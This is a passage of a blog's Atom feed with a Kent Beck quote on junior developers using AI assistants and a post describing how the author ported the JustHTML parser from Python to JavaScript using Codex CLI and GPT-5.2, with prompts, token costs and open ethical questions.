+</summary><category term="gemini"/><category term="ai-personality"/><category term="generative-ai"/><category term="ai"/><category term="llms"/></entry><entry><title>Quoting Kent Beck</title><link href="https://simonwillison.net/2025/Dec/16/kent-beck/#atom-everything" rel="alternate"/><published>2025-12-16T01:25:37+00:00</published><updated>2025-12-16T01:25:37+00:00</updated><id>https://simonwillison.net/2025/Dec/16/kent-beck/#atom-everything</id><summary type="html">
+    &lt;blockquote cite="https://tidyfirst.substack.com/p/the-bet-on-juniors-just-got-better"&gt;&lt;p&gt;I’ve been watching junior developers use AI coding assistants well. Not vibe coding—not accepting whatever the AI spits out. Augmented coding: using AI to accelerate learning while maintaining quality. [...]&lt;/p&gt;
+&lt;p&gt;The juniors working this way compress their ramp dramatically. Tasks that used to take days take hours. Not because the AI does the work, but because the AI collapses the search space. Instead of spending three hours figuring out which API to use, they spend twenty minutes evaluating options the AI surfaced. The time freed this way isn’t invested in another unprofitable feature, though, it’s invested in learning. [...]&lt;/p&gt;
+&lt;p&gt;If you’re an engineering manager thinking about hiring: &lt;strong&gt;The junior bet has gotten better.&lt;/strong&gt; Not because juniors have changed, but because the genie, used well, accelerates learning.&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p class="cite"&gt;&amp;mdash; &lt;a href="https://tidyfirst.substack.com/p/the-bet-on-juniors-just-got-better"&gt;Kent Beck&lt;/a&gt;, The Bet On Juniors Just Got Better&lt;/p&gt;
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/careers"&gt;careers&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-assisted-programming"&gt;ai-assisted-programming&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/kent-beck"&gt;kent-beck&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="careers"/><category term="ai-assisted-programming"/><category term="generative-ai"/><category term="ai"/><category term="llms"/><category term="kent-beck"/></entry><entry><title>I ported JustHTML from Python to JavaScript with Codex CLI and GPT-5.2 in 4.5 hours</title><link href="https://simonwillison.net/2025/Dec/15/porting-justhtml/#atom-everything" rel="alternate"/><published>2025-12-15T23:58:38+00:00</published><updated>2025-12-15T23:58:38+00:00</updated><id>https://simonwillison.net/2025/Dec/15/porting-justhtml/#atom-everything</id><summary type="html">
+    &lt;p&gt;I &lt;a href="https://simonwillison.net/2025/Dec/14/justhtml/"&gt;wrote about JustHTML yesterday&lt;/a&gt; - Emil Stenström's project to build a new standards compliant HTML5 parser in pure Python code using coding agents running against the comprehensive html5lib-tests testing library. Last night, purely out of curiosity, I decided to try &lt;strong&gt;porting JustHTML from Python to JavaScript&lt;/strong&gt; with the least amount of effort possible, using Codex CLI and GPT-5.2. It worked beyond my expectations.&lt;/p&gt;
+&lt;h4 id="tl-dr"&gt;TL;DR&lt;/h4&gt;
+&lt;p&gt;I built &lt;a href="https://github.com/simonw/justjshtml"&gt;simonw/justjshtml&lt;/a&gt;, a dependency-free HTML5 parsing library in JavaScript which passes 9,200 tests from the html5lib-tests suite and imitates the API design of Emil's JustHTML library.&lt;/p&gt;
+&lt;p&gt;It took two initial prompts and a few tiny follow-ups. &lt;a href="https://simonwillison.net/2025/Dec/11/gpt-52/"&gt;GPT-5.2&lt;/a&gt; running in &lt;a href="https://github.com/openai/codex"&gt;Codex CLI&lt;/a&gt; ran uninterrupted for several hours, burned through 1,464,295 input tokens, 97,122,176 cached input tokens and 625,563 output tokens and ended up producing 9,000 lines of fully tested JavaScript across 43 commits.&lt;/p&gt;
+&lt;p&gt;Time elapsed from project idea to finished library: about 4 hours, during which I also bought and decorated a Christmas tree with family and watched the latest Knives Out movie.&lt;/p&gt;
+&lt;h4 id="some-background"&gt;Some background&lt;/h4&gt;
+&lt;p&gt;One of the most important contributions of the HTML5 specification ten years ago was the way it precisely specified how &lt;em&gt;invalid&lt;/em&gt; HTML should be parsed. The world is full of invalid documents and having a specification that covers those means browsers can treat them in the same way - there's no more "undefined behavior" to worry about when building parsing software.&lt;/p&gt;
+&lt;p&gt;Unsurprisingly, those invalid parsing rules are pretty complex! The free online book &lt;a href="https://htmlparser.info/"&gt;Idiosyncrasies of the HTML parser&lt;/a&gt; by Simon Pieters is an excellent deep dive into this topic, in particular &lt;a href="https://htmlparser.info/parser/"&gt;Chapter 3. The HTML parser&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;The Python &lt;a href="https://github.com/html5lib/html5lib-python"&gt;html5lib&lt;/a&gt; project started the &lt;a href="https://github.com/html5lib/html5lib-tests"&gt;html5lib-tests&lt;/a&gt; repository with a set of implementation-independent tests. These have since become the gold standard for interoperability testing of HTML5 parsers, and are used by projects such as &lt;a href="https://github.com/servo/servo"&gt;Servo&lt;/a&gt; which used them to help build &lt;a href="https://github.com/servo/html5ever"&gt;html5ever&lt;/a&gt;, a "high-performance browser-grade HTML5 parser" written in Rust.&lt;/p&gt;
+&lt;p&gt;Emil Stenström's &lt;a href="https://github.com/EmilStenstrom/justhtml"&gt;JustHTML&lt;/a&gt; project is a pure-Python implementation of an HTML5 parser that passes the full html5lib-tests suite. Emil &lt;a href="https://friendlybit.com/python/writing-justhtml-with-coding-agents/"&gt;spent a couple of months&lt;/a&gt; working on this as a side project, deliberately picking a problem with a comprehensive existing test suite to see how far he could get with coding agents.&lt;/p&gt;
+&lt;p&gt;At one point he had the agents rewrite it based on a close inspection of the Rust html5ever library. I don't know how much of this was direct translation versus inspiration (here's Emil's &lt;a href="https://news.ycombinator.com/item?id=46264195#46267059"&gt;commentary on that&lt;/a&gt;) - his project has 1,215 commits total so it appears to have included a huge amount of iteration, not just a straight port.&lt;/p&gt;
+&lt;p&gt;My project &lt;strong&gt;is&lt;/strong&gt; a straight port. I instructed Codex CLI to build a JavaScript version of Emil's Python code.&lt;/p&gt;
+&lt;h4 id="the-process-in-detail"&gt;The process in detail&lt;/h4&gt;
+&lt;p&gt;I started with a bit of mise en place. I checked out two repos and created an empty third directory for the new project:&lt;/p&gt;
+&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;&lt;span class="pl-c1"&gt;cd&lt;/span&gt; &lt;span class="pl-k"&gt;~&lt;/span&gt;/dev
+git clone https://github.com/EmilStenstrom/justhtml
+git clone https://github.com/html5lib/html5lib-tests
+mkdir justjshtml
+&lt;span class="pl-c1"&gt;cd&lt;/span&gt; justjshtml&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Then I started Codex CLI for GPT-5.2 like this:&lt;/p&gt;
+&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;codex --yolo -m gpt-5.2&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;That &lt;code&gt;--yolo&lt;/code&gt; flag is a shortcut for &lt;code&gt;--dangerously-bypass-approvals-and-sandbox&lt;/code&gt;, which is every bit as dangerous as it sounds.&lt;/p&gt;
+&lt;p&gt;My first prompt told Codex to inspect the existing code and use it to build a specification for the new JavaScript library:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;We are going to create a JavaScript port of ~/dev/justhtml - an HTML parsing library that passes the full ~/dev/html5lib-tests test suite. It is going to have a similar API to the Python library but in JavaScript. It will have no dependencies other than raw JavaScript, hence it will work great in the browser and node.js and other environments. Start by reading ~/dev/justhtml and designing the user-facing API for the new library - create a spec.md containing your plan.&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;I reviewed the spec, which included a set of proposed milestones, and told it to add another:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Add an early step to the roadmap that involves an initial version that parses a simple example document that is valid and returns the right results. Then add and commit the spec.md file.&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Here's &lt;a href="https://github.com/simonw/justjshtml/blob/19b8eb1f2ca80f428a3c40862d5ec05d36e5166b/spec.md"&gt;the resulting spec.md file&lt;/a&gt;. My request for that initial version became "Milestone 0.5" which looked like this:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Milestone 0.5 — End-to-end smoke parse (single valid document)&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Implement the smallest end-to-end slice so the public API is real early:
+&lt;ul&gt;
+&lt;li&gt;
+&lt;code&gt;new JustHTML("&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;p&amp;gt;Hello&amp;lt;/p&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;")&lt;/code&gt; returns a tree with the expected tag structure and text nodes.&lt;/li&gt;
+&lt;li&gt;
+&lt;code&gt;doc.toText()&lt;/code&gt; returns &lt;code&gt;"Hello"&lt;/code&gt; and &lt;code&gt;doc.errors&lt;/code&gt; is empty for this valid input.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Add &lt;code&gt;scripts/smoke.js&lt;/code&gt; (no deps) that runs the example and asserts the expected structure/output.&lt;/li&gt;
+&lt;li&gt;Gate: &lt;code&gt;node scripts/smoke.js&lt;/code&gt; passes.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Then I told it:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Implement Milestone 0.5&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;And off it went. The resulting code appeared to work so I said:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Configure GitHub Actions test.yml to run that on every commit, then commit and push&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;I ran &lt;code&gt;git init&lt;/code&gt; and created a private GitHub repository for this project at this point, and set up the local directory to push to that remote.&lt;/p&gt;
+&lt;p&gt;Here's &lt;a href="https://github.com/simonw/justjshtml/commit/48497cbd05584c88af757a0736a2ee447468b6b3"&gt;that initial push&lt;/a&gt;. Then I told it:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;OK do the rest, commit and push often&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;And that was almost it!&lt;/p&gt;
+&lt;p&gt;I set my laptop to not fall asleep and left it to its devices while we went off to buy a Christmas tree. The "commit and push often" meant I could monitor its progress on my phone by refreshing &lt;a href="https://github.com/simonw/justjshtml/commits/main"&gt;the commit log on GitHub&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;I was running this against my $20/month ChatGPT Plus account, which has a five hour token allowance window for Codex CLI. That ran out at 6:35pm and Codex paused, so I waited until the reset point at 7:14pm and typed:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Keep going&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;At 9:30pm it declared itself done with the following summary message:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;• What’s Done
+
+  - html5lib-tests now run in CI and pass: tokenizer 6810/6810, tree 1770/1782
+    (12 skipped: #script-on), serializer 230/230, encoding 82/83 (1 skipped:
+    scripted) (.github/workflows/test.yml:1).
+  - Public API expanded: stream() (src/stream.js:1), CSS selectors query()/
+    matches() (src/selector.js:1), and toMarkdown() (src/markdown.js:1), all
+    exported via src/index.js:1.
+  - Added no-deps unit scripts for selectors/stream/markdown (scripts/run-
+    selector-tests.js:1, scripts/run-stream-tests.js:1, scripts/run-markdown-
+    tests.js:1) and wired them into CI.
+  - Fixed TreeBuilder so &amp;lt;br&amp;gt; no longer closes &amp;lt;p&amp;gt; (src/treebuilder.js:647).
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;As a finishing touch, I had it add a playground interface so I could try out the new library in my browser. I prompted:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Add a playground.html in the top level folder which loads the necessary ES modules from ./src/... and implements the exact same functionality as seen on https://tools.simonwillison.net/justhtml but using the JavaScript library instead of Pyodide&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;It fetched my &lt;a href="https://tools.simonwillison.net/justhtml"&gt;existing JustHTML playground page&lt;/a&gt; (&lt;a href="https://simonwillison.net/2025/Dec/14/justhtml/#first-impressions-of-justhtml"&gt;described here&lt;/a&gt;) using &lt;code&gt;curl&lt;/code&gt; and built a new &lt;code&gt;playground.html&lt;/code&gt; file that loaded the new JavaScript code instead. This worked &lt;em&gt;perfectly&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;I enabled GitHub Pages for my still-private repo which meant I could access the new playground at this URL:&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://simonw.github.io/justjshtml/playground.html"&gt;https://simonw.github.io/justjshtml/playground.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://static.simonwillison.net/static/2025/justjshtml-playground.jpg" alt="Screenshot of JustJSHTML Playground web application. Header reads &amp;quot;JustJSHTML Playground&amp;quot; with subtitle &amp;quot;A dependency-free JavaScript HTML5 parser - GitHub&amp;quot;. Below is a status bar showing &amp;quot;JavaScript Environment&amp;quot; with a green &amp;quot;Ready&amp;quot; badge. The main input area has &amp;quot;Paste HTML&amp;quot; and &amp;quot;Fetch from URL&amp;quot; buttons, with a text area containing HTML code: &amp;quot;&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Example Page&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;header&amp;gt; &amp;lt;nav&amp;gt; &amp;lt;ul&amp;gt;&amp;quot;. A &amp;quot;Playground Mode&amp;quot; section shows buttons for &amp;quot;CSS Selector Query&amp;quot;, &amp;quot;Pretty Print HTML&amp;quot;, &amp;quot;Tree Structure&amp;quot;, &amp;quot;Stream Events&amp;quot;, &amp;quot;Extract Text&amp;quot;, and &amp;quot;To Markdown&amp;quot; (highlighted in purple). Below is a text field labeled &amp;quot;CSS Selector (optional - leave empty for whole document):&amp;quot; with placeholder &amp;quot;e.g., article, main, .content (or leave empty)&amp;quot; and a green &amp;quot;Convert to Markdown&amp;quot; button. The Output section has a teal header with &amp;quot;Whole document&amp;quot; badge and displays converted markdown: &amp;quot;Example Page&amp;quot; followed by &amp;quot;- [Home](/)&amp;quot; &amp;quot;- [About](/about)&amp;quot; &amp;quot;- [Contact](/contact)&amp;quot;." style="max-width: 100%;" /&gt;&lt;/p&gt;
+&lt;p&gt;All it needed now was some documentation:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Add a comprehensive README with full usage instructions including attribution plus how this was built plus how to use in in HTML plus how to use it in Node.js&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;You can &lt;a href="https://github.com/simonw/justjshtml/blob/f3a33fdb29bf97846fd017185edc8cf82783032e/README.md"&gt;read the result here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;We are now at eight prompts total, running for just over four hours and I've decorated for Christmas and watched &lt;a href="https://en.wikipedia.org/wiki/Wake_Up_Dead_Man"&gt;Wake Up Dead Man&lt;/a&gt; on Netflix.&lt;/p&gt;
+&lt;p&gt;According to Codex CLI:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Token usage: total=2,089,858 input=1,464,295 (+ 97,122,176 cached) output=625,563 (reasoning 437,010)&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;My &lt;a href="https://www.llm-prices.com/#it=2089858&amp;amp;cit=97122176&amp;amp;ot=625563&amp;amp;sel=gpt-5.2"&gt;llm-prices.com calculator&lt;/a&gt; estimates that at $29.41 if I was paying for those tokens at API prices, but they were included in my $20/month ChatGPT Plus subscription so the actual extra cost to me was zero.&lt;/p&gt;
+&lt;h4 id="what-can-we-learn-from-this-"&gt;What can we learn from this?&lt;/h4&gt;
+&lt;p&gt;I'm sharing this project because I think it demonstrates a bunch of interesting things about the state of LLMs in December 2025.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Frontier LLMs really can perform complex, multi-hour tasks with hundreds of tool calls and minimal supervision. I used GPT-5.2 for this but I have no reason to believe that Claude Opus 4.5 or Gemini 3 Pro would not be able to achieve the same thing - the only reason I haven't tried is that I don't want to burn another 4 hours of time and several million tokens on more runs.&lt;/li&gt;
+&lt;li&gt;If you can reduce a problem to a robust test suite you can set a coding agent loop loose on it with a high degree of confidence that it will eventually succeed. I called this &lt;a href="https://simonwillison.net/2025/Sep/30/designing-agentic-loops/"&gt;designing the agentic loop&lt;/a&gt; a few months ago. I think it's the key skill to unlocking the potential of LLMs for complex tasks.&lt;/li&gt;
+&lt;li&gt;Porting entire open source libraries from one language to another via a coding agent works extremely well.&lt;/li&gt;
+&lt;li&gt;Code is so cheap it's practically free. Code that &lt;em&gt;works&lt;/em&gt; continues to carry a cost, but that cost has plummeted now that coding agents can check their work as they go.&lt;/li&gt;
+&lt;li&gt;We haven't even &lt;em&gt;begun&lt;/em&gt; to unpack the etiquette and ethics around this style of development. Is it responsible and appropriate to churn out a direct port of a library like this in a few hours while watching a movie? What would it take for code built like this to be trusted in production?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;I'll end with some open questions:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Does this library represent a legal violation of copyright of either the Rust library or the Python one?&lt;/li&gt;
+&lt;li&gt;Even if this is legal, is it ethical to build a library in this way?&lt;/li&gt;
+&lt;li&gt;Does this format of development hurt the open source ecosystem?&lt;/li&gt;
+&lt;li&gt;Can I even assert copyright over this, given how much of the work was produced by the LLM?&lt;/li&gt;
+&lt;li&gt;Is it responsible to publish software libraries built in this way?&lt;/li&gt;
+&lt;li&gt;How much better would this library be if an expert team hand crafted it over the course of several months?&lt;/li&gt;
+&lt;/ul&gt;
+    
+        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/html"&gt;html&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/javascript"&gt;javascript&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/python"&gt;python&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-assisted-programming"&gt;ai-assisted-programming&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/gpt-5"&gt;gpt-5&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/codex-cli"&gt;codex-cli&lt;/a&gt;&lt;/p&gt;
+    
+
+</summary><category term="html"/><category term="javascript"/><category term="python"/><category term="ai"/><category term="generative-ai"/><category term="llms"/><category term="ai-assisted-programming"/><category term="gpt-5"/><category term="codex-cli"/></entry></feed>
